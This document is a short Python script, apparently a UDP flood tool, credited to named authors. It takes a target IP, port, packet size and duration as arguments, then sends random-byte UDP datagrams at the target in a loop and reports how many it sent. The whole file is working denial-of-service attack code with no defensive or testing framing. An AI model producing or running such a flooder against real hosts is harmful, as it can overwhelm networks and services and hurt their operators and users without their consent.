#!/usr/bin/env python3
#Code by LeeOn123, adjusted by Jesse Rengers
import random
import socket
import time
import sys

ip = str(sys.argv[1])
port = int(sys.argv[2])
packet_size = int(sys.argv[3])
duration = int(sys.argv[4])

def run():
    data = random._urandom(packet_size)
    i = random.choice(("[*]","[!]","[#]"))
    startTime = time.time()
    i = 0
    while True:
        if time.time() > startTime + duration:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            s.sendto(data,addr)
            i += 1
        except:
            print("[!] Error!!!")
    print("sent " + str(i) + " packets in " + str(time.time() - startTime) + " seconds")
    sys.stdout.flush()
run()